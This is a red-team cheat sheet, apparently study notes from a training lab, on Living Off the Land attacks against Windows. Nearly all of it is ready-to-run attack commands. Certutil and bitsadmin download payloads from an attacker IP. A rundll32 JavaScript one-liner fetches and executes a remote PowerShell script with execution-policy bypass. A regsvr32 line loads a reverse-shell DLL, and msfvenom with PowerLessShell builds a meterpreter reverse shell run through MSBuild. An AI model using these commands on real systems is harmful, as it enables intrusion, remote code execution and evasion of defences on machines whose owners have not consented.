### What is?
Living Off the Land is a trending term in the red team community. The name is taken from real-life, living by eating the available food on the land. Similarly, adversaries and malware creators take advantage of a target computer's built-in tools and utilities. The term Living Off the Land was introduced at DerbyCon3 in 2013 and has gained more traction in the red team community ever since, becoming an often used and popular technique.
These built-in tools perform various regular activities within the target system or network capabilities; however, they are increasingly used and abused, for example, using the CertUtil tool to download malicious files into the target machine.

### Download files with Certutil.exe
```
certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe

-urlcache to display URL, enables the URL option to use in the command
-split -f  to split and force fetching files from the provided URL.
```

### Download files with BITSAdmin.exe
```
bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe

/Transfer to use the transfer option
/Download we are specifying transfer using download type
/Priority we are setting the priority of the job to be running in the foreground
```

### Download files with Strings.exe
```
findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe

/V to print out the lines that don't contain the string provided.
dummystring the text to be searched for; in this case, we provide a string that must not be found in a file.
> c:\Windows\Temp\test.exe redirect the output to a file on the target machine. 
```

### Encode files with Certutil
```
certutil -encode payload.exe Encoded-payload.txt
```

### Spawn a child process from Explorer.exe
```
explorer.exe /root,"C:\Windows\System32\calc.exe"
```

### Spawn a child process from wmic.exe
```
wmic.exe process call create calc
```

### Spawn a child process from Rundll32.exe
```
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
```

### Run a Powershell script from Rundll32.exe
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
```

### Catch a meterpreter session from Regsvr32.exe
```
Create a Revshell as .dll
Setup a listener in a meterpreter session
Upload the malicous .ddl to the machine
c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\maliciuosshell.dll
```

### Run "unsigned" malicious payloads bypassing with bash.exe(WSL)
```
bash.exe -c "path-to-payload"
```

### Run Powershell code without Spawning Powershell process
Use: https://github.com/Mr-Un1k0d3r/PowerLessShell.git
```
Generate a malicious revshell as Powershell: msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
Setup a listener in a meterpreter session
Convert malicious powershell payload to a MSBuild project: python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
```

```
Invoke the payload with MSBuild.exe: c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
```
